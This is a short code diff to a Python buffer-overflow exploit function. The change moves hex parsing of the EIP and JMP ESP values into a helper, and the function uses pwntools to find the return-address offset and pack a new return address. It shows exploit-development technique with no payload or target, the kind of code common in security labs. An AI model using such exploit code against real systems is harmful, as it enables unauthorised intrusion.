@@ -4,15 +4,14 @@ import socket
 
 
 def exploit(host, port, fuzzsize, eip, jmpesp):
+    def base16format(num):
+        return int("0x" + num, 16)
+
     offset = pwn.cyclic_metasploit_find(
-        int(
-            "0x" + eip, 16
-        )
+        base16format(eip)
     )
 
-    jmpesp = int(
-        "0x" + jmpesp, 16
-    )
+    jmpesp = base16format(jmpesp)
 
     neweip = struct.pack("<I", jmpesp)
 
